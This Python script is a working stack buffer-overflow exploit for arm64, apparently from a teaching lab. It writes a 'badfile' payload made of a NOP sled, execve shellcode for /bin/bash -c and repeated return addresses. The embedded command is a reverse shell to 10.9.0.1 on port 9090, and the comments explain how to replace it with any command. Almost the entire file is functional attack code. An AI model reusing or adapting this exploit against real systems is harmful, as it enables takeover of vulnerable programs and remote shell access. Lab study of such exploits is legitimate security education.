#!/usr/bin/python3
import sys

shellcode= (
   "\x0b\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
   "\x28\x01\x80\xd2\x69\x6a\x28\x38\x88\x01\x80\xd2\x69\x6a\x28\x38"
   "\xe8\x09\x80\xd2\x69\x6a\x28\x38\x08\x0a\x80\xd2\xe9\x03\x13\xaa"
   "\x69\x6a\x28\xf8\x08\x0b\x80\xd2\x49\x01\x80\xd2\xe9\x03\x09\xcb"
   "\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0c\x80\xd2\x09\x02\x80\xd2"
   "\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0d\x80\xd2"
   "\x29\x01\x09\xca\x69\x6a\x28\xf8\xe0\x03\x13\xaa\x61\x42\x01\xb1"
   "\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
   "/bin/bash*"
   "-c****"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker              * 
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1                *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# Fill the content with NOP's (0xD503201F is NOP instruction in arm64)
nop = (0xD503201F).to_bytes(4,byteorder='little')
content = bytearray(517)
for offset in range(int(500/4)):  
   content[offset*4:offset*4 + 4] = nop

##################################################################
# Put the shellcode somewhere in the payload
start = 200              # Need to change
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
buffer_address = 0x0000fffffffff5a8
ret    = buffer_address + start         # but the return address  

# Use 8 for 64-bit address
for offset in range(104, 200, 8):
   if offset < 200: # fill everything between 100 -200 with the return address since we don't know BUF_SIZE
      content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

